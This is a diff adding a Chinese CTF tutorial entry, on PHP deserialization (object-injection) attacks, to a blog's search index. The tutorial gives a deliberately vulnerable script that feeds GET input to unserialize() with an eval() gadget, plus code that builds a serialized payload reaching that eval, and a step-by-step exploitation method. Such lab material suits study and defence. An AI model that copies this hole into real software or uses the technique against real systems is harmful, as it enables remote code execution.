@@ -2148,4 +2148,98 @@ int main()
         <tag>C</tag>
       </tags>
   </entry>
+  <entry>
+    <title>CTF-Web-PHP反序列化</title>
+    <url>/2020/12/631a292b.html</url>
+    <content><![CDATA[<h1 id="概念解释"><a href="#概念解释" class="headerlink" title="概念解释"></a>概念解释</h1><p>PHP 反序列化漏洞又叫做 PHP 对象注入漏洞，我觉得这个表达很不直白，也不能说明根本的问题，不如我们叫他 PHP 对象的属性篡改漏洞好了(别说这是我说的~~)</p>
+<p>反序列化漏洞的成因在于代码中的 unserialize() 接收的参数可控，从上面的例子看，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现最终的攻击。</p>
+<a id="more"></a>
+
+<h1 id="魔法方法"><a href="#魔法方法" class="headerlink" title="魔法方法"></a>魔法方法</h1><ol>
+<li>construct(): 当对象创建时会自动调用（但在unserialize()时不会自动调用）</li>
+<li>wakeup(): unserialize()时会自动调用</li>
+<li>destruct(): 当对象被销毁时会自动调用</li>
+<li>toString(): 当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</li>
+<li>get(): 当从不可访问的属性读取数据</li>
+<li>call(): 在对象上下文中调用不可访问的方法时触发</li>
+</ol>
+<p>特别说明第四点：</p>
+<p>_toString触发条件较多，因此容易被忽略，常见的触发条件如下：</p>
+<blockquote>
+<p>(1)echo (<code>$obj</code>) / print(<code>$obj</code>) 打印时会触发</p>
+<p>(2)反序列化对象与字符串连接时</p>
+<p>(3)反序列化对象参与格式化字符串时</p>
+<p>(4)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）</p>
+<p>(5)反序列化对象参与格式化SQL语句，绑定参数时</p>
+<p>(6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</p>
+<p>(7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有<strong>toString返回的字符串的时候</strong>toString会被调用</p>
+<p>(8)反序列化的对象作为 class_exists() 的参数的时候</p>
+</blockquote>
+<h1 id="魔法方法的作用"><a href="#魔法方法的作用" class="headerlink" title="魔法方法的作用"></a>魔法方法的作用</h1><p>反序列化了其他的类对象以后我们只是控制了是属性，如果你没有在完成反序列化后的代码中调用其他类对象的方法，我们还是束手无策，毕竟代码是人家写的，人家本身就是要反序列化后调用该类的某个安全的方法，你总不能改人家的代码吧，但是没关系，因为我们有魔法方法。</p>
+<p>魔法正如上面介绍的，魔法方法的调用是在该类序列化或者反序列化的同时自动完成的，不需要人工干预，这就非常符合我们的想法，因此只要魔法方法中出现了一些我们能利用的函数，我们就能通过反序列化中对其对象属性的操控来实现对这些函数的操控，进而达到我们发动攻击的目的。</p>
+<h1 id="利用魔法方法发起攻击"><a href="#利用魔法方法发起攻击" class="headerlink" title="利用魔法方法发起攻击"></a>利用魔法方法发起攻击</h1><h2 id="测试代码："><a href="#测试代码：" class="headerlink" title="测试代码："></a>测试代码：</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">K0rz3n</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$K0rz3n</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"i am K0rz3n"</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">L</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name">L</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Welcome to XDSEC"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name">Evil</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">var</span> <span class="token variable">$test2</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们先来分析一下这段代码，首先我们能看到 unserialize() 函数的参数我们是可以控制的，也就是说我们能通过这个接口反序列化任何类的对象(但只有在当前作用域的类才对我们有用)，那我们看一下当前这三个类，我们看到后面两个类反序列化以后对我们没有任何意义，因为我们根本没法调用其中的方法，但是第一个类就不一样了，虽然我们也没有什么代码能实现调用其中的方法的，但是我们发现他有一个魔法函数 __destruct() ，这就非常有趣了，因为这个函数能在对象销毁的时候自动调用，不用我们人工的干预，好，既然这样我们就决定反序列化这个类的对象了，接下来让我们看一下怎么利用(我上面说过了，我们需要控制这个类的某些属性，通过控制属性实现我们的攻击)</p>
+<p>那我们看一下哪些属性的控制是对我们有用的(这个时候我们就跳过了<strong>construct() 方法，毕竟他永远不会被调用)，因为这个例子比较简单，</strong>destruct() 里面只用到了一个属性 test ，那肯定就是他了，那我们控制这个属性为什么内容我们就能攻击了呢，我们再观察一下 那些地方调用了 action() 函数，看看这个函数的调用中有没有存在执行命令或者是其他我们能利用的点的，果然我们在 Evil 这个类中发现他的 action() 函数调用了 eval(),那我们的想法就很明确了，我们需要将 K0rz3n 这个类中的 test 属性篡改为 Evil 这个类的对象，然后为了 eval 能执行命令，我们还要篡改 Evil 对象的 test2 属性，将其改成我们的 Payload</p>
+<p>分析完毕以后我们就可以构建我们的序列化字符串了，构建的方法不是手写(当然你愿意我也不拦着你，理论上是可行的)，我们要将这段代码复制一下，然后修改一些内容并进行序列化操作</p>
+<h2 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">K0rz3n</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Evil</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+
+<span class="token keyword">class</span> <span class="token class-name">Evil</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">var</span> <span class="token variable">$test2</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"phpinfo();"</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">&#125;</span>
+
+<span class="token variable">$K0rz3n</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">K0rz3n</span><span class="token punctuation">;</span>
+<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$K0rz3n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"seria.txt"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们去除了一切与我们要篡改的属性无关的内容，对其进行序列化操作，然后将序列化的结果复制出来，向刚刚的代码发起请求。可以看到我们攻击成功，特别要提醒一下的就是我在图中框起来的部分，上面说过由于是私有属性，他有自己特殊的格式会在前后加两个 %00 ，所以我们在传输过程中绝对不能忘掉。</p>
+<h2 id="反序列化漏洞方法小结"><a href="#反序列化漏洞方法小结" class="headerlink" title="反序列化漏洞方法小结"></a>反序列化漏洞方法小结</h2><ol>
+<li>寻找unserialize()函数的参数是否有可控点</li>
+<li>寻找反序列化目标，重点为**<em>wakeup()或destruct()**</em>魔法函数的类</li>
+<li>一层一层的研究该类在魔法方法中使用的属性和属性调用的方法，看看是否有可控的属性能实现在当前调用的过程中触发的</li>
+<li>找到要控制的属性之后将要用到的代码部分复制下来，构造序列化，发起攻击</li>
+</ol>
+<p><strong><em>To Be Continued</em></strong></p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
 </search>
